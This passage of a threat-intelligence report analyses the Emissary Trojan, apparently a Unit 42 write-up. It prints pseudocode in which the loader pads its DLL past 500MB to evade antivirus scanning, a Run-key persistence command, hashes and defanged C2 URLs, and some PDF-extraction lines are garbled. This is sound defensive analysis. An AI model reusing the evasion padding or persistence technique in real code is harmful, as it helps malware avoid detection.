Emissary versions 5.3 and 5.4, which involves\n\nthe removal of the command ‘107’ used to update the Trojan. The string ‘107’ still exists within the\n\nTrojan, however, the command handler does not check the C2 response for this command and the\n\ncode used to update the Trojan has been removed.\n\nThe major difference between Emissary version 5.4 and all previous versions is how the Trojan is\n\nsaved and loaded. First, the filenames of the various components of Emissary changed to the\n\nfollowing; however, the filename for debug logs has not changed:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n%APPDATA%\\Programs\\Syncmgr.dll ­> Loader Trojan\n\n%APPDATA%\\Programs\\60HGBC00.DAT ­> Configuration File\n\n%APPDATA%\\Programs\\WEB2013BW6.DAT ­> Emissary Trojan\n\n%TEMP%\\000A758C8FEAE5F.TMP ­> Log file\n\nIn addition to file name changes, the biggest (pardon the pun) change involves the Loader Trojan\n\n(Syncmgr.dll) appending junk data to the end of the Emissary DLL file to make incredibly large files.\n\nThe reason for creating such large files is to trick antivirus applications into not scanning the file, as it\n\ncould exceed the maximum size of files the antivirus can scan (even VirusTotal has a maximum file\n\nsize of 128MB). For instance, the following pseudo code contains two loops that will end up\n\nappending 524,288,000 bytes to the end of file, resulting in a DLL that exceeds 500MB in size:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n\n-----\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\nWriteFile(hFile, buf_EmissaryDllFromResource, nNumberOfBytesToWrite, &nNumberOfBytesToWrite,\n\n0);\n\nbuf_junkData = 0;\n\nret_time = time(0);\n\nsrand(ret_time);\n\nfor ( i = 0; i < 51200; ++i )\n\n{\n\nfor ( j = 0; j < 640; ++j )\n\n{\n\nrandom_byte = rand() % 255;\n\noffset_in_buff_junkData = &buf_junkData + 16 * j;\n\ndword_junkData = 0x1010101 * random_byte;\n\n*offset_in_buff_junkData = dword_junkData;\n\n*(offset_in_buff_junkData + 1) = dword_junkData;\n\n*(offset_in_buff_junkData + 2) = dword_junkData;\n\n*(offset_in_buff_junkData + 3) = dword_junkData;\n\n}\n\nWriteFile(hFile, &buf_junkData, 0x2800u, &nNumberOfBytesToWrite, 0);\n\n}\n\nWith the new filenames, malware persistence is achieved via the following registry key:\n\n1\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Syncmgr: \"rundll32.exe \"C:\\Documents and\n\nSettings\\[username]>\\Application Data\\Programs\\Syncmgr.dll\",Setting\"\n\n**Date: 11/24/2015**\n\nSHA256: bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636 (Base DLL\n\nwith junk data removed)\n\nOriginal Name: WinDLL.dll\n\nIn another attempt to avoid detection based on PE header hashes, the Trojan was recompiled\n\nwithout making any changes.\n\n## Conclusion\n\nTh t i E i h i l t d b hi d O ti L t Bl h\n\n\n-----\n\nhave enough resources to have multiple custom RATs that receive regular updates. The targeting is\n\nlargely military or government, with some cases of higher education and high tech companies. They\n\nalso have the ability to select and use appropriate decoys in multiple Asian languages that appear\n\nlegitimate.\n\nThe use of Emissary appears to be focused only on Taiwan and Hong Kong, with regular malware\n\nupdates to avoid detection and to increase the odds of success. Of particular note, there is an\n\ninteresting coincidence between the timing of the publication of our Operation Lotus Blossom report\n\nand a flurry of Emissary updates. The first occurred ten days after publication and was followed by\n\nupdates over increasingly shorter time frames, starting at roughly every three months and\n\nprogressing to monthly by the final version discussed here. Until that publication, according to our\n\nresearch Emissary was updated roughly every two years. This indicates the threat actors may take\n\nnote of threat intelligence reporting and are fully capable of making immediate changes when\n\ndeemed necessary.\n\nIn addition to the malware evolution, the actors also shifted from solely spear­phishing targets with\n\nattachments to also compromising legitimate websites to host malware. The consistent updates to\n\nthe Trojan and the shift in the actor’s TTPs suggests that this threat will continue to use Emissary in\n\nfuture espionage related attacks.\n\n[We have updated the Emissary tag for Palo Alto Networks AutoFocus users to track this threat using](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Emissary)\n\nthe indicators discussed in this blog.\n\n**Emissary Delivery Documents**\n\n42b8898c07374b1fc6a4a33441aadf10e47f226d9d3bf3368a459c0e221dff73\n\n37f752f89b0384291af23542efc08c01be962c04e3b2c881a8bc1f8771e9179f\n\n52b7f93bd4c2d1b1818f2a9506551852e2e7b511c9298e71edb54a39f69f94f2\n\n5cda2251059c34f55ac23941b56e248b9a1111e98f62c5a307eadbb9618592dd\n\n70097adba2743653bc73d0a2909a13f2904dbbcc1ffdb4e9013a8e61866abf5c\n\n9bb0288f7b98fac909ed91ec24dad0d5a31e3eec93a1641849d9dab56c23aa59\n\nb201c89fd7bdfc625bacfd4850feaa81269d9b41ed10ba1f7c0cb1339f4a6abe\n\nddbe42fb03bf9f4b9144396e814f13cd7054dcf238234dcb838fa9643136c03a\n\ne67d3cc1684c789c3bd02af7a68b783fd90dc6d2d660b174d533f4c0e07490f9\n\n0c550fad82f2653bc13d9629357a2a56df82602ee0ce96aa5a31f885e3aa29df\n\nf36b7f63f46 6 f 8882b34 1 11597 8537 3 7f 8b6521 83308940 77b\n\n\n-----\n\nfdcd10a2c2bf802ba5b6be55c16c0bf407bcbee902b66466b0f954d2951fad2d\n\nda29b647411153b49cbf4df862e3f36209eafb8ebe8b966429edec4fb15dbce9\n\n721676d529a0c439594502f1d53fec697adc80fa1301d2bf20c2600d99ceed4e\n\n0069029ee4029df88f700da335a06e0e3a534a94552fe966186166b526a20b6a\n\n9420017390c598ee535c24f7bcbd39f40eca699d6c94dc35bcf59ddf918c59ab\n\n26e2f4f9026f19156a73ffbfde438916f24d80b8812b6cebe98167eb9be0863c\n\n8e3b7dc3dca92d7458265e2bcd69caa558cbbf24bbbf1200b9aa924260c42480\n\ne817610b62ccd00bdfc9129f947ac7d078d97525e9628a3aa61027396dba419b\n\n02831316a3a04c1248605f28fb08d810230dd4411b2a1fc8187508aea6b449c5\n\n675869fac21a94c8f470765bc6dd15b17cc4492dd639b878f241a45b2c3890fc\n\n70561f58c9e5868f44169854bcc906001947d98d15e9b4d2fbabd1262d938629\n\n925d2f960d8db0510f3681c038311c0c2df86c5ba03f8cb61e3c8846c31bd6e1\n\n98fb1d2975babc18624e3922406545458642e01360746870deee397df93f50e0\n\na8b0d084949c4f289beb4950f801bf99588d1b05f68587b245a31e8e82f7a1b8\n\nb07fbb92484fd2aff6d28f0ab04d5f51e96420b6d670f921b0bbe0e5392da408\n\nc72b07f2a423abc4fc45dfddc5162b8eb1ea97d5b5e66811526433f09b6cdf41\n\ndd8ffb9f961299f7cc9cb51e17a5cccf79b7fb583e594b05ef93b54c8cad54f6\n\nfbcb401cf06326ab4bb53fb9f01f1ca647f16f926811ea66984f1a1b8cf2f7bb\n\ne21b47dfa9e250f49a3ab327b7444902e545bed3c4dcfa5e2e990af20593af6d\n\n**Emissary DLL Version 1.0 through 5.4**\n\na7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484\n\ne6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30\n\n931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb\n\n5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099\n\n\n-----\n\ndcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3\n\n5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58\n\n70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\n\nc145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634\n\n375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\n\ne369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\n\n29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\n\n46ad72811990c1937d26e1f80ec1b9def8c112817f4bb9f94e3d1e4f0fb86f80\n\nbfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636\n\n731cd2ce87f4c4375782de0686b5b16619f8fa2de188522cbc8e64f8851bb7ed\n\nacf7dc5a10b00f0aac102ecd9d87cd94f08a37b2726cb1e16948875751d04cc9\n\n**Emissary C2 URLs**\n\nhttp://101.55.121[.]79/lightserver/Default.aspx\n\nhttp://101.55.33[.]92/default.aspx\n\nhttp://101.55.33[.]92:80/default.aspx\n\nhttp://101.55.33[.]95:80/default.aspx\n\nhttp://103.243.24[.]179/Default.aspx\n\nhttp://118.193.221[.]233:80/default.aspx\n\nhttp://123.1.159[.]153/lightserver/Default.aspx\n\nhttp://123.1.159[.]210/lightserver/Default.aspx\n\nhttp://140.131.39[.]11/icanxp/help/help/default.aspx\n\nhttp://163.20.127[.]27/0test/test/default.aspx\n\nhttp://203.124.14[.]214/default.aspx\n\nhttp://203.124.14[.]229/default.aspx\n\nhttp://210.209.121[.]31/lightserver/default.aspx\n\nhttp://210.209.121[.]92/lightserver/Default.aspx\n\nhttp://210.209.121[.]92/weboffice/Default.aspx\n\nhttp://appletree.onthenetas[.]com/Default.aspx\n\nhttp://bluefield.byinter[.]net/lightserver/Default.aspx\n\nhttp://booking.passinggas[.]net/lightserver/Default.aspx\n\nhttp://chairman.OnTheNetAs[.]com/weboffice/Default.aspx\n\nhttp://dnt5b.myfw[.]us/Default.aspx\n\n\n-----\n\nhttp://eventlog.findhere[.]org/Default.aspx\n\nhttp://grassland.OnTheNetAs[.]com/lightserver/Default.aspx\n\nhttp://groupspace.findhere[.]org/lightserver/Default.aspx\n\nhttp://photograph.myfw[.]us/lightserver/default.aspx\n\nhttp://ustar5.PassAs[.]us/Default.aspx\n\nhttp://ustar5.PassAs[.]us/default.aspx\n\nhttp://webonline.OnTheNetAs[.]com/lightserver/default.aspx\n\nhttp://www.danangqt[.]net:80/default.aspx\n\nhttp://zooboo.PassingGas[.]net/weboffice/Default.aspx\n\n**Emissary Campaign Codes**\n\n3test\n\nFJ201508\n\nlyk_WW\n\nA­1117a\n\nQPR­Z0330\n\nYUIO\n\nZGP­M\n\nxman\n\nA­1117a\n\nFlash\n\nFJ20151125\n\nYUIO\n\nll\n\nA­1231a\n\nux­2011\n\nRT101212\n\n111\n\nUPG­ZHG­01\n\nIC00001\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/oyqcfzoa1hfq5evuymj5bqfitkqlfp4v"
    ],
    "report_names": [
        "PaloAlto_Emissary-Trojan-Changelog-Did-Operation-Lotus-Blossom-Cause-It-to-Evolve(Feb-03-16)"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a1ce86c2-3efc-4115-a85e-92c5fa461838",
            "created_at": "2022-10-25T16:47:55.561071Z",
            "updated_at": "2025-03-27T02:05:17.261424Z",
            "deleted_at": null,
            "main_name": "BRONZE ELGIN",
            "aliases": [
                "Lotus Blossom ",
                "Lotus Panda ",
                "Lstudio",
                "Spring Dragon ",
                "CTG-8171 "
            ],
            "source_name": "Secureworks:BRONZE ELGIN",
            "tools": [
                " Lzari",
                "Elise"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2fa14cf4-969f-48bc-b68e-a8e7eedc6e98",
            "created_at": "2022-10-25T15:50:23.538608Z",
            "updated_at": "2025-03-27T02:00:55.495551Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "Lotus Blossom",
                "DRAGONFISH",
                "Spring Dragon",
                "RADIUM",
                "Raspberry Typhoon"
            ],
            "source_name": "MITRE:Lotus Blossom",
            "tools": [
                "Elise"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "eaa8168f-3fab-4831-aa60-5956f673e6b3",
            "created_at": "2022-10-25T16:07:23.805824Z",
            "updated_at": "2025-03-27T02:02:09.986613Z",
            "deleted_at": null,
            "main_name": "Lotus Blossom",
            "aliases": [
                "ATK 1",
                "ATK 78",
                "Billbug",
                "Bronze Elgin",
                "CTG-8171",
                "Dragonfish",
                "Lotus Blossom",
                "Operation Lotus Blossom",
                "Red Salamander",
                "Spring Dragon",
                "Thrip"
            ],
            "source_name": "ETDA:Lotus Blossom",
            "tools": [
                "BKDR_ESILE",
                "Catchamas",
                "EVILNEST",
                "Elise",
                "Group Policy Results Tool",
                "Hannotog",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "PsExec",
                "Rikamanu",
                "Sagerunex",
                "Spedear",
                "Syndicasec",
                "WMI Ghost",
                "Wimmie",
                "gpresult"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "87a20b72-ab72-402f-9013-c746c8458b0b",
            "created_at": "2023-01-06T13:46:38.293223Z",
            "updated_at": "2025-03-27T02:00:02.796483Z",
            "deleted_at": null,
            "main_name": "LOTUS PANDA",
            "aliases": [
                "Lotus BLossom",
                "Spring Dragon",
                "ST Group",
                "DRAGONFISH",
                "BRONZE ELGIN",
                "ATK1",
                "G0030",
                "Red Salamander"
            ],
            "source_name": "MISPGALAXY:LOTUS PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041628,
    "ts_creation_date": 1454974291,
    "ts_modification_date": 1454974291,
    "files": {
        "pdf": "https://archive.orkl.eu/31c81ceafb1de9c731e7e003e3a638b9841a78e4.pdf",
        "text": "https://archive.orkl.eu/31c81ceafb1de9c731e7e003e3a638b9841a78e4.txt",
        "img": "https://archive.orkl.eu/31c81ceafb1de9c731e7e003e3a638b9841a78e4.jpg"
    }
}